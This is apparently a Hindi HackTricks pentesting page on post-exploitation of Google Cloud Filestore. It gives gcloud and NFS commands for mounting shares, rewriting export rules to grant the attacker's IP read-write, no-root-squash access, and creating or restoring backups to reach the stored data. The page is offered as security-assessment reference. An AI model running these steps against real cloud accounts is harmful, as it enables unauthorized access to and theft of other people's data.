# GCP - Filestore पोस्ट एक्सप्लॉइटेशन

{{#include ../../../banners/hacktricks-training.md}}

## Filestore

Filestore के बारे में अधिक जानकारी के लिए देखें:

{{#ref}}
../gcp-services/gcp-filestore-enum.md
{{#endref}}

### Filestore माउंट करें

एक साझा फ़ाइल सिस्टम **संवेदनशील जानकारी** हो सकता है जो हमलावरों के दृष्टिकोण से दिलचस्प है। Filestore तक पहुँच के साथ, इसे **माउंट करना** संभव है:
```bash
sudo apt-get update
sudo apt-get install nfs-common
# Check the share name
showmount -e <IP>
# Mount the share
mkdir /mnt/fs
sudo mount [FILESTORE_IP]:/[FILE_SHARE_NAME] /mnt/fs
```
फाइलस्टोर इंस्टेंस का IP पता खोजने के लिए पृष्ठ के एन्यूमरेशन सेक्शन की जांच करें:

{{#ref}}
../gcp-services/gcp-filestore-enum.md
{{#endref}}

### प्रतिबंध हटाएं और अतिरिक्त अनुमतियाँ प्राप्त करें

यदि हमलावर उस IP पते पर नहीं है जिसके पास शेयर पर पहुंच है, लेकिन आपके पास इसे संशोधित करने के लिए पर्याप्त अनुमतियाँ हैं, तो इसे हटाना संभव है। यह आपके IP पते पर अधिक विशेषाधिकार प्रदान करना भी संभव है ताकि शेयर पर प्रशासनिक पहुंच प्राप्त की जा सके:
```bash
gcloud filestore instances update nfstest \
--zone=<exact-zone> \
--flags-file=nfs.json

# Contents of nfs.json
{
"--file-share":
{
"capacity": "1024",
"name": "<share-name>",
"nfs-export-options": [
{
"access-mode": "READ_WRITE",
"ip-ranges": [
"<your-ip-private-address>/32"
],
"squash-mode": "NO_ROOT_SQUASH",
"anon_uid": 1003,
"anon_gid": 1003
}
]
}
}
```
### Restore a backup

यदि एक बैकअप है, तो इसे एक मौजूदा या नए इंस्टेंस में **पुनर्स्थापित** करना संभव है ताकि इसकी **जानकारी सुलभ हो जाए:**
```bash
# Create a new filestore if you don't want to modify the old one
gcloud filestore instances create <new-instance-name> \
--zone=<zone> \
--tier=STANDARD \
--file-share=name=vol1,capacity=1TB \
--network=name=default,reserved-ip-range=10.0.0.0/29

# Restore a backups in a new instance
gcloud filestore instances restore <new-instance-name> \
--zone=<zone> \
--file-share=<instance-file-share-name> \
--source-backup=<backup-name> \
--source-backup-region=<backup-region>

# Follow the previous section commands to mount it
```
### एक बैकअप बनाएं और इसे पुनर्स्थापित करें

यदि आपके पास **शेयर पर पहुंच नहीं है और आप इसे संशोधित नहीं करना चाहते**, तो **इसका बैकअप बनाना** और इसे **पुनर्स्थापित करना** संभव है जैसा कि पहले उल्लेख किया गया है:
```bash
# Create share backup
gcloud filestore backups create <back-name> \
--region=<region> \
--instance=<instance-name> \
--instance-zone=<instance-zone> \
--file-share=<share-name>

# Follow the previous section commands to restore it and mount it
```
{{#include ../../../banners/hacktricks-training.md}}
